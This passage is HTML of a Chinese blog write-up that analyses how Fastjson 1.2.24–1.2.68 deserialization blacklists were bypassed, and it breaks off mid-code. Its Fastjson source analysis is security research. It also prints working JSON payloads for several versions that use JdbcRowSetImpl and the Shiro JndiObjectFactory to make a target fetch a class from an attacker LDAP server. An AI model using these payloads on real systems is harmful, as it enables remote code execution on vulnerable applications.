+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://Jiecub3.github.io/zh/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/search" title="搜索🔍︎">
+                    <span>搜索🔍︎</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://Jiecub3.github.io/zh/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">🏠主页</a>&nbsp;»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Fastjson1.2.24-1.2.80 反序列化
+    </h1>
+    <div class="post-meta"><span title='2025-06-01 20:01:23 +0800 CST'>2025-06-01</span>&nbsp;·&nbsp;19 分钟&nbsp;·&nbsp;Jiecub3
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul><ul>
+                    <li>
+                        <a href="#12241247" aria-label="1.2.24~1.2.47">1.2.24~1.2.47</a><ul>
+                            
+                    <li>
+                        <a href="#1224" aria-label="1.2.24">1.2.24</a></li>
+                    <li>
+                        <a href="#12251241" aria-label="1.2.25~1.2.41"><strong>1.2.25~1.2.41</strong></a></li>
+                    <li>
+                        <a href="#1242" aria-label="1.2.42"><strong>1.2.42</strong></a></li>
+                    <li>
+                        <a href="#1243" aria-label="1.2.43">1.2.43</a></li>
+                    <li>
+                        <a href="#1247%e9%80%9a%e6%9d%80" aria-label="&amp;lt;1.2.47(通杀!!!)"><strong>&lt;1.2.47(通杀!!!)</strong></a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#12481268" aria-label="1.2.48~1.2.68">1.2.48~1.2.68</a><ul>
+                            
+                    <li>
+                        <a href="#1267%e5%88%86%e6%9e%90%e4%b8%80%e6%9d%a1%e9%93%be%e5%ad%90" aria-label="1.2.67分析一条链子">1.2.67分析一条链子</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%be%aa%e7%8e%af%e5%bc%95%e7%94%a8-ref" aria-label="循环引用 $ref">循环引用 $ref</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#1268expectclass" aria-label="&amp;lt;1.2.68(expectClass">&lt;1.2.68(expectClass</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%85%b7%e4%bd%93%e5%88%a9%e7%94%a8%e6%9f%a5%e6%89%be" aria-label="具体利用查找">具体利用查找</a></li>
+                    <li>
+                        <a href="#expectclass%e6%9f%a5%e6%89%be" aria-label="expectClass查找">expectClass查找</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%97%a0autotypesupport" aria-label="无autoTypeSupport">无autoTypeSupport</a></li>
+                    <li>
+                        <a href="#return-%e5%b0%8f%e7%bb%93" aria-label="return 小结">return 小结</a></li>
+                    <li>
+                        <a href="#%e6%80%8e%e4%b9%88%e6%89%be" aria-label="怎么找">怎么找</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#1268%e5%b0%8f%e7%bb%93" aria-label="1.2.68小结">1.2.68小结</a></li>
+                    <li>
+                        <a href="#%e4%bf%ae%e5%a4%8d" aria-label="修复">修复</a></li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#12731280" aria-label="1.2.73~1.2.80">1.2.73~1.2.80</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86" aria-label="利用原理">利用原理</a></li>
+                    <li>
+                        <a href="#why-public-filed" aria-label="why public filed">why public filed</a></li>
+                    <li>
+                        <a href="#gadget" aria-label="gadget">gadget</a><ul>
+                            
+                    <li>
+                        <a href="#jdbc" aria-label="jdbc">jdbc</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e4%bf%ae%e5%a4%8d-1" aria-label="修复">修复</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#cve-2022-25845" aria-label="CVE-2022-25845">CVE-2022-25845</a><ul>
+                            
+                    <li>
+                        <a href="#step1-put-javaioinputstream" aria-label="Step1: put java.io.InputStream">Step1: put java.io.InputStream</a><ul>
+                            
+                    <li>
+                        <a href="#ref%e7%9a%84%e5%88%a9%e7%94%a8" aria-label="$ref的利用">$ref的利用</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#step2%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96" aria-label="Step2：文件读取">Step2：文件读取</a><ul>
+                            
+                    <li>
+                        <a href="#getbom" aria-label="getBom()">getBom()</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#step3-%e5%86%99%e5%85%a5%e6%96%87%e4%bb%b6" aria-label="Step3: 写入文件">Step3: 写入文件</a></li>
+                    <li>
+                        <a href="#step4-%e5%8a%a0%e8%bd%bdclass" aria-label="Step4 加载class">Step4 加载class</a></li></ul>
+                    </li></ul>
+                        
+                    <li>
+                        <a href="#feature%e7%bb%93%e8%ae%ba" aria-label="Feature(结论):"><strong>Feature(结论):</strong></a><ul>
+                            
+                    <li>
+                        <a href="#%e7%89%88%e6%9c%ac%e6%8e%a2%e6%b5%8b" aria-label="版本探测">版本探测</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><blockquote>
+<p>做个总结，忘了捡得快</p>
+</blockquote>
+<h2 id="12241247">1.2.24~1.2.47<a hidden class="anchor" aria-hidden="true" href="#12241247">#</a></h2>
+<p>1.2.24-1.2.47（绕过黑名单的poc <strong>都需开启autoTypeSupport</strong> 用于返回class，关闭throw</p>
+<h3 id="1224">1.2.24<a hidden class="anchor" aria-hidden="true" href="#1224">#</a></h3>
+<p>两个常用poc，无过滤</p>
+<ul>
+<li>
+<p><strong>TemplatesImpl 反序列化</strong></p>
+</li>
+<li>
+<p><strong>JdbcRowSetImpl 反序列化</strong></p>
+</li>
+</ul>
+<h3 id="12251241"><strong>1.2.25~1.2.41</strong><a hidden class="anchor" aria-hidden="true" href="#12251241">#</a></h3>
+<p>增加了黑/白名单检测，但是再最后<code>loadClass()</code>时，会对我们传入的class进行<code>L</code>和<code>;</code>的截取再加载class （<code>Lxxx;</code>-&gt;<code>xxx</code>）</p>
+<p>导致可以通过<code>L;</code>绕过前面的<code>黑名单检测</code>，最后加载时再截取及可以加载我们想要的class，从而<code>绕过黑名单</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//开启autoTypeSupport</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;</span><span class="p">,</span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="1242"><strong>1.2.42</strong><a hidden class="anchor" aria-hidden="true" href="#1242">#</a></h3>
+<p>在<code>checkAutoType</code>最开始时及会对class进行一次<code>L;</code>的截取，然后进行黑名单检测再<code>loadClass()</code>，但是这个截取只会进行一次，所以可以双写<code>L;</code>进行绕过，<code>LLxxx;;</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// poc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//开启autoTypeSupport</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;LLcom.sun.rowset.JdbcRowSetImpl;;&#34;</span><span class="p">,</span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h3 id="1243">1.2.43<a hidden class="anchor" aria-hidden="true" href="#1243">#</a></h3>
+<p>在此版本中,<code>checkAutoType</code>对<code>LL</code>进行了判断，如果类以<code>LL</code>开头，则直接抛出异常</p>
+<p>但是在<code>loadClass()</code>中除了<code>L;</code>的截取，会有对<code>[</code>开头的截取，所以我们用<code>[</code>进行绕过，但是直接用会存在报错，根据报错填上对应字符<code>{</code>即可</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// poc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  </span><span class="c1">//开启autoTypeSupport</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;[com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="o">[</span><span class="p">{,</span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><strong>1.2.44</strong></p>
+<ul>
+<li>修复了<code>[</code>的绕过，在<code>checkAutoType</code>中进行判断如果类名以<code>[</code>开始则直接抛出异常</li>
+</ul>
+<h3 id="1247通杀"><strong>&lt;1.2.47(通杀!!!)</strong><a hidden class="anchor" aria-hidden="true" href="#1247通杀">#</a></h3>
+<p><strong>无需开启autoTypeSupport</strong></p>
+<blockquote>
+<p>简述：通过<code>Class.class</code>对应的deserializer反序列化，实现<code>恶意class</code>的<code>加载</code>和<code>map存储</code>，然后再通过<code>@type</code>触发，从map中获取存储的class完成<code>恶意class的获取</code>，这个过程完全避免了<code>autoType的黑白名单检测</code></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;1&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Class&#34;</span><span class="p">,</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">},</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;2&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ldap://127.0.0.1:1389/g0tvin&#34;</span><span class="p">,</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>初始化时会给<code>deserializers</code>存入一些类型</p>
+<p><img loading="lazy" src="images/image-20250527153738301.png" alt="image-20250527153738301"  />
+</p>
+<p>所下面这里会找到Class.class</p>
+<p><img loading="lazy" src="images/image-20250527154119964.png" alt="image-20250527154119964"  />
+</p>
+<p>然后return class，再对对应的<code>deserializer</code>进行反序列化</p>
+<p><img loading="lazy" src="images/image-20250527153949786.png" alt="image-20250527153949786"  />
+</p>
+<p>而deserialze()中会对<code>val</code>设置的值进行<code>loadClass()</code></p>
+<p><img loading="lazy" src="images/image-20250527154718471.png" alt="image-20250527154718471"  />
+</p>
+<p>并且加载成功会将其put到<code>mappings</code>中（cache默认就是<code>true</code>）,没错这里<code>mappings</code>就是<code>getClassFromMapping()</code>中获取的<code>map</code>，所以我们只需要再<code>@type</code>调用jdbc即可（这里因为是<code>没开启autoTypeSupport</code>，所以不会进入第一个for黑白名单检测，而通过<code>getClassFromMapping()</code>获取到class后，有if判断进行<code>return class</code>，不再进行后续代码，及实现了没有黑名单检测）</p>
+<p><img loading="lazy" src="images/image-20250527155011569.png" alt="image-20250527155011569"  />
+</p>
+<p><img loading="lazy" src="images/image-20250527155407289.png" alt="image-20250527155407289"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getClassFromMapping</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">mappings</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">className</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h2 id="12481268">1.2.48~1.2.68<a hidden class="anchor" aria-hidden="true" href="#12481268">#</a></h2>
+<p><strong>1.2.48</strong></p>
+<ul>
+<li>在<code>MiscCodec</code>中修改了<code>cache</code>的默认值，修改为<code>false</code>，并且对<code>TypeUtils.loadClass</code>中的<code>mapping.put</code>做了限制</li>
+</ul>
+<blockquote>
+<p>在此版本中新增了一个<code>safeMode</code>功能，如果开启的话，将会直接抛出异常，完全杜绝了<code>autoTypeSupport</code>的绕过</p>
+<p>这里还存在一些<strong>黑名单绕过</strong>（需要开启autoTypeSupport</p>
+<p><a href="https://www.anquanke.com/post/id/232774#h3-18">https://www.anquanke.com/post/id/232774#h3-18</a></p>
+</blockquote>
+<h3 id="1267分析一条链子">1.2.67分析一条链子<a hidden class="anchor" aria-hidden="true" href="#1267分析一条链子">#</a></h3>
+<p><a href="https://www.anquanke.com/post/id/232774#h3-16">https://www.anquanke.com/post/id/232774#h3-16</a></p>
+<p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong> <strong>绕过黑名单</strong> 需要<code>开启AutoTypeSupport</code>（不然没地方加载class）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">a67</span><span class="o">=</span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.jndi.JndiObjectFactory\&#34;,\&#34;resourceName\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;,\&#34;instance\&#34;:{\&#34;$ref\&#34;:\&#34;$.instance\&#34;}}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSON</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">a67</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
+<p>这里通过<code>setResourceName</code>设置<code>jndi恶意vps</code>，然后<code>getInstance</code>触发jndi请求</p>
+<p><code>&quot;instance&quot;:{}</code>这里不能这样使用，因为<code>public T getInstance() {</code>返回值类型<code>不</code>继承自Collection.class Map AtomicBoolean AtomicInteger AtomicLong 这里<code>T</code>调试类型是<code>java.lang.Object</code></p>
+<p>但是可以通<code>$ref</code>来触发，那么看看$ref是怎么处理的</p>
+</blockquote>
+<h4 id="循环引用-ref">循环引用 $ref<a hidden class="anchor" aria-hidden="true" href="#循环引用-ref">#</a></h4>
+<p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p>
+<table>
+<thead>
+<tr>
+<th>语法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>{&quot;$ref&quot;:&quot;$&quot;}</td>
+<td>引用根对象</td>
+</tr>
+<tr>
+<td>{&quot;$ref&quot;:&quot;@&quot;}</td>
+<td>引用自己</td>
+</tr>
+<tr>
+<td>{&quot;$ref&quot;:&quot;..&quot;}</td>
+<td>引用父对象</td>
+</tr>
+<tr>
+<td>{&quot;$ref&quot;:&quot;../..&quot;}</td>
+<td>引用父对象的父对象</td>
+</tr>
+<tr>
+<td>{&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;}</td>
+<td>基于路径的引用</td>
+</tr>
+</tbody>
+</table>
+<p>$ref在反序列化json时，会进行一些初始化设置值，便于后续调用</p>
+<p><img loading="lazy" src="images/image-20250527112641868.png" alt="image-20250527112641868"  />
+</p>
+<p>value是反序列化完的<code>对象</code>，然后handleResovleTask进行ref的调用</p>
+<p><img loading="lazy" src="images/image-20250527111208262.png" alt="image-20250527111208262"  />
+</p>
+<p>调用前，还会初始化一些fieldInfo，使一些本来不能调用方法，可以调用，比如这里是通过<code>computeGetters</code>初始getter方法的。但是这里就<code>不限制返回值</code>了，所以<code>getInstance</code>得以被添加</p>
+<p>这里满足长度&gt;=4,第四位数为大写基本上就可以添加到filedInfo里面了</p>
+<p><img loading="lazy" src="images/image-20250527111242910.png" alt="image-20250527111242910"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="s">&#34;instance&#34;</span><span class="p">:{</span><span class="s">&#34;$ref&#34;</span><span class="p">:</span><span class="s">&#34;$.instance&#34;</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>然后再通过<code>$ref</code>去获取{}(整个对象)下&quot;instance&quot;，从而触发获取对象的<code>instance</code>属性，及调用fieldInfo中对应的getter方法，获取<code>instance</code>值，触发<code>getInstance</code>得以利用</p>
+<p><img loading="lazy" src="images/image-20250527113724025.png" alt="image-20250527113724025"  />
+</p>
+<h3 id="1268expectclass">&lt;1.2.68(expectClass<a hidden class="anchor" aria-hidden="true" href="#1268expectclass">#</a></h3>
+<p>在不开启<code>autoTypeSupport</code>的情况下，还有一个点可以利用expectClass，加载<code>恶意class</code>后满足下面两个条件就能<code>返回</code>class</p>
+<ul>
+<li>传入<code>expectClass</code>不为null</li>
+<li>恶意class继承<code>expectClass</code></li>
+</ul>
+<p><img loading="lazy" src="images/image-20250527171423759.png" alt="image-20250527171423759"  />
+</p>
+<p>正常即使绕过黑名单也需要开启autoTypeSupport，保证class的返回</p>
+<p><img loading="lazy" src="images/image-20250527172710281.png" alt="image-20250527172710281"  />
+</p>
+<h4 id="具体利用查找">具体利用查找<a hidden class="anchor" aria-hidden="true" href="#具体利用查找">#</a></h4>
+<p>而正常调用，我们的<code>expectClass</code>都是<code>null</code>，所以我们可以查找<code>checkAutoType</code>其他地方的调用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="na">checkAutoType</span><span class="p">(</span><span class="n">typeName</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">lexer</span><span class="p">.</span><span class="na">getFeatures</span><span class="p">());</span><span class="w">
+</span></span></span></code></pre></div><p>发现有2处，且都是<code>反序列化</code>的时候调用，分别是<code>JavaBeanDeserializer</code>，<code>ThrowableDeserializer</code></p>
+<p><img loading="lazy" src="images/image-20250527174517311.png" alt="image-20250527174517311"  />
+</p>
+<p>及我们需要取看怎么获取这两个<code>serializer</code>，那就是去分析<code>getDeserializer()</code>呗，我们的<code>expectClass</code>不属于上面类时会进入到<code>createJavaBeanDeserializer()</code>，同时看到上方<code>else if</code>，<code>expectClass</code>继承与<code>Throwable.class</code>即可返回<code>ThrowableDeserializer反序列化器</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Throwable</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">isAssignableFrom</span><span class="p">(</span><span class="n">clazz</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">derializer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ThrowableDeserializer</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">clazz</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250528094227484.png" alt="image-20250528094227484"  />
+</p>
+<p>可以看到经过<code>createJavaBeanDeserializer()</code>一系列处理后，可以返回<code>JavaBeanDeserializer反序列化器</code>，后续则会调用</p>
+<p><img loading="lazy" src="images/image-20250528094533040.png" alt="image-20250528094533040"  />
+</p>
+<p>然后这里json指针继续向后读取，<code>key</code>为<code>@type</code>时进入if，并读取值作为<code>typeName</code>传入<code>config.checkAutoType(typeName, expectClass, lexer.getFeatures())；</code></p>
+<p><img loading="lazy" src="images/image-20250528095626527.png" alt="image-20250528095626527"  />
+</p>
+<p>到这里就完成了<code>expectClass</code>的传入了，然后想要完成return只需要，继承于<code>expectClass</code>，且不是黑名单即可</p>
+<p><img loading="lazy" src="images/image-20250528100537640.png" alt="image-20250528100537640"  />
+</p>
+<h4 id="expectclass查找">expectClass查找<a hidden class="anchor" aria-hidden="true" href="#expectclass查找">#</a></h4>
+<p>上面分析，我们知道怎么利用这个expectClass来加载我们恶意class了，但是还需要找到一个<code>expectClass</code>来return 自己的class，并进入到<code>createJavaBeanDeserializer()</code></p>
+<h5 id="无autotypesupport">无autoTypeSupport<a hidden class="anchor" aria-hidden="true" href="#无autotypesupport">#</a></h5>
+<p>首先<code>无autoTypeSupport</code> 完成 <code>return class</code>，及分析<code>checkAutoType()</code>逻辑</p>
+<p>可以看到<strong>无</strong><code>autoTypeSupport</code>和<code>expectClass</code>，会先在<code>mappings</code>和<code>deserializers</code>查找然后返回class</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">deserializers</span><span class="p">.</span><span class="na">findClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250528101108255.png" alt="image-20250528101108255"  />
+</p>
+<p>继续往下到<code>第二次黑/白名单</code>检测，使得autoTypeSupport为false也会进行waf检测，但是可以发现是白名单的话则会<strong>直接loadclass并返回class</strong></p>
+<p><img loading="lazy" src="images/image-20250528101641182.png" alt="image-20250528101641182"  />
+</p>
+<p>然后继续往下就还有最后一处，继承于<code>JSONType.class</code>也会<code>return class</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getAnnotation</span><span class="p">(</span><span class="n">clazz</span><span class="p">,</span><span class="n">JSONType</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
